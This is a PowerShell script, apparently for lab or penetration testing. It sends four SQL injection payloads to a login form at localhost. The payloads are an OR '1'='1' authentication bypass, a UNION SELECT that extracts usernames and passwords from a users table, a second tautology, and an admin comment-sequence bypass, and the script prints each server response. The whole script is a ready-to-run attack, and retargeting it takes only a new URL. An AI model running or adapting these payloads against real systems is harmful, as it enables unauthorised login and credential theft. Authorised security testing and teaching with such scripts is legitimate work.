<#
.SYNOPSIS
    Example SQL Injection payloads for testing a vulnerable login form.
.DESCRIPTION
    Sends various SQL injection payloads to a target URL using PowerShell 7's Invoke-WebRequest.
.NOTES
    Requires PowerShell 7+.
#>

$TargetUrl = "http://localhost:5000/login"

Write-Host "[*] Attempting classic authentication bypass..."
Invoke-WebRequest -Uri $TargetUrl -Method POST -Body @{username="admin' OR '1'='1"; password="irrelevant"} | Select-Object -ExpandProperty Content

Write-Host "`n[*] Attempting UNION-based injection to enumerate users..."
Invoke-WebRequest -Uri $TargetUrl -Method POST -Body @{username="admin' UNION SELECT username, password FROM users--"; password="irrelevant"} | Select-Object -ExpandProperty Content

Write-Host "`n[*] Attempting tautology-based injection..."
Invoke-WebRequest -Uri $TargetUrl -Method POST -Body @{username="' OR '1'='1"; password=""} | Select-Object -ExpandProperty Content

Write-Host "`n[*] Attempting comment sequence injection..."
Invoke-WebRequest -Uri $TargetUrl -Method POST -Body @{username="admin' -- "; password=""} | Select-Object -ExpandProperty Content

Write-Host "`n[*] Done. Review the responses above for signs of SQL injection vulnerability."